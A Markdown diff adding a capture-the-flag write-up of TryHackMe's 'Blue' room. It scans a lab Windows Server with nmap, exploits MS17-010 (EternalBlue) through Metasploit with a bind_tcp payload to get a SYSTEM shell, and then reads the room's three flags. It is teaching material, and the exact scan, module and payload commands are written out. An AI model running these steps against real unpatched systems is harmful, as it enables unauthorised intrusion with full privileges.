@@ -1,0 +1,189 @@
+---
+layout: writeup
+lang: en
+permalink: /en/writeups/blue/
+title: "Blue"
+ref: blue
+date: 2026-08-01
+bare: true
+platform: THM
+os: Windows Server 2012 R2 Datacenter
+difficulty: Easy
+series: thm-windows
+tags: [win, smb, MS17-010, metasploit, privesc]
+txt: /writeups-files/blue.txt
+summary: "EternalBlue over SMB. The reverse_tcp payload gets blocked outbound, bind_tcp opens a shell straight in as SYSTEM."
+---
+
+# Writeup — Blue (TryHackMe)
+
+OS: Windows Server 2012 R2 Datacenter
+Difficulty: Easy
+Date: 20 August 2026
+
+---
+
+## Summary
+
+Standalone Windows machine, not domain-joined. nmap reveals SMB exposed with a version vulnerable to MS17-010 (EternalBlue). it was exploited with the dedicated, recommended Metasploit module, with a first attempt failing because the "reverse_tcp" payload was blocked outbound. switching to a "bind_tcp" payload the shell opens and comes in directly as SYSTEM (elevated privileges). from there just manual filesystem enumeration to recover any useful data (the room's three flags)
+
+Chain: nmap → SMB vulnerable to MS17-010 → Metasploit EternalBlue → bind_tcp payload → SYSTEM shell → filesystem exploration →  flags in C:, System32\config and Users\Jon\Documents.
+
+---
+
+## additional tools and methodology
+
+an llm was used during the session: for looking up CVE details, interpreting raw output, suggesting unexplored vectors when stuck, and detailed explanation of technical concepts. the execution and the operational decisions were mine. the writeup was written by me and later cleaned up with the same tool.
+
+---
+
+## Preface
+
+room done on an AttackBox provided by TryHackMe, not on my local machine. several tools already available in /root/Desktop/Tools and /opt/, wordlists in /usr/share/wordlists, and the attackbox already had bloodhound, metasploit, postman, caido, exploitdb and ghidra among others. 
+Room intended and described in the introduction as a first contact with EternalBlue, and completed in about an hour of work 
+the technical part wasn't demanding, the time lost was on the first failed exploit attempt through metasploit and on finding the right command to read a file's contents from a Windows shell,since I didn't remember it and it isn't Linux where a simple grep solves it.
+
+---
+
+## Phase 1 — Reconnaissance
+
+first scan with script and version, no reply:
+
+nmap -Pn -sC -sV -T4 10.114.166.198
+
+ICMP disabled, hence the -Pn in every subsequent scan.
+I try a wider port range:
+
+nmap -Pn -T4 --top-ports 1000 10.114.166.198
+
+Result:
+
+135/tcp open msrpc
+139/tcp open netbios-ssn
+445/tcp open microsoft-ds
+3389/tcp open ms-wbt-server
+49152-49155/tcp open unknown
+
+SMB and RDP exposed, no domain (no 389/88 so it's a standalone machine). 
+with 445 open the first sensible thing is to check MS17-010, looked up online after reading about it in the room introduction before starting:
+
+nmap -Pn -p445 --script smb-os-discovery,smb-vuln-ms17-010 10.114.166.198
+we're telling nmap to run two precise NSE scripts it holds inside itself= 
+smb-os-discovery queries SMB and tries to derive OS, hostname, domain, Windows version, which can be very useful to us given that Metasploit will be used (especially the version).
+smb-vuln-ms17-010 only checks whether SMB is vulnerable to MS17-010 (EternalBlue)
+nmap has hundreds of ready-made scripts in /usr/share/nmap/scripts/ just like these
+
+Output confirms:
+
+VULNERABLE: MS17-010, CVE-2017-0143
+OS: Windows Server 2012 R2 Datacenter 9600
+Computer name: WIN-JO6REVNMMMP
+
+target confirmed EternalBlue.
+
+---
+
+## Phase 2 — Exploitation 
+
+Metasploit already installed on the machine,I look for the module:
+
+Command sequence:
+msfconsole (then opened manually from the Desktop shortcut, the command was running forever)
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.114.166.198
+show options
+
+no mandatory parameter missing at a glance. also confirmed by having the chatbot read the show options output. first attempt with the default payload (reverse_tcp):
+
+run
+
+the preliminary check confirms the vulnerability, the exploit starts but the module stops on:
+
+Exploit failed with the following error: Read timeout expired when reading from the Socket (timeout=30)
+Exploit completed, but no session was created.
+
+I understand no session was created. it may be a probable outbound firewall on the target machine, but I have little knowledge about the other causes. 
+
+after this failed attempt, what worked was found by the chatbot, justifiable because the room already said it: in the "Task2" instructions it was written to set set payload windows/x64/shell/reverse_tcp before launching the exploit, "for the sake of learning". I hadn't read it, since I was working almost entirely on my own inside the machine.
+So:
+
+set PAYLOAD windows/x64/shell_bind_tcp
+set LPORT 4444
+exploit
+
+this time the check is identical but the session opens:
+
+Command shell session 1 opened (10.114.130.193:44197 -> 10.114.166.198:4444)
+
+shell as:
+
+C:\Windows\system32>whoami
+nt authority\system
+
+SYSTEM straight away with no intermediate privilege escalation step .
+
+---
+
+## Phase 3 — Enumeration and flag recovery
+
+users present on the machine:
+
+dir C:\Users
+
+Administrator, Jon, Public. I start from Jon:
+
+dir C:\Users\Jon\Documents
+
+Directory of C:\Users\Jon\Documents
+....
+07/31/2026 01:29 PM 37 flag3.txt
+
+type C:\Users\Jon\Documents\flag3.txt
+flag{admin_documents_can_be_valuable}
+
+first flag found. Administrator\Desktop and Administrator\Documents turn out to be practically empty, and with little time left on the Free machine I search directly by filename straight from the root since I can move anywhere in the filesystem:
+
+dir C:\flag*.txt   (the equivalent of a grep in Linux)
+
+Directory of C:\
+07/31/2026 01:24 PM 24 flag1.txt
+
+type C:\flag1.txt
+flag{access_the_machine}
+
+a third flag is still not found, I assume it's tied to the SAM database given the room's hints about NTLM and hashes that I read in this phase to get some context. but fortunately it was enough to search recursively across the whole filesystem again:
+
+dir /s C:\flag2.txt
+
+Directory of C:\Windows\System32\config   (the path where the flag was)
+07/31/2026 01:26 PM 34 flag2.txt
+
+type C:\Windows\System32\config\flag2.txt
+flag{sam_database_elevated_access}
+
+all three flags recovered.
+
+---
+
+## Full chain
+
+nmap top-ports → SMB and RDP exposed
+→ smb-vuln-ms17-010 confirms CVE-2017-0143
+→ Metasploit exploit/windows/smb/ms17_010_eternalblue
+→ reverse_tcp payload fails (timeout)
+→ shell_bind_tcp payload works
+→ direct shell as nt authority\system
+→ manual filesystem enumeration → 3 flags recovered
+
+---
+
+## Lessons learned
+
+read the room instructions before launching anything, even when they seem obvious. in this case the hint about switching payload was already written there and I only found it somewhere else after wasting time looking for it elsewhere.
+
+---
+
+## Tools used
+
+nmap, msfconsole/metasploit (exploit/windows/smb/ms17_010_eternalblue)
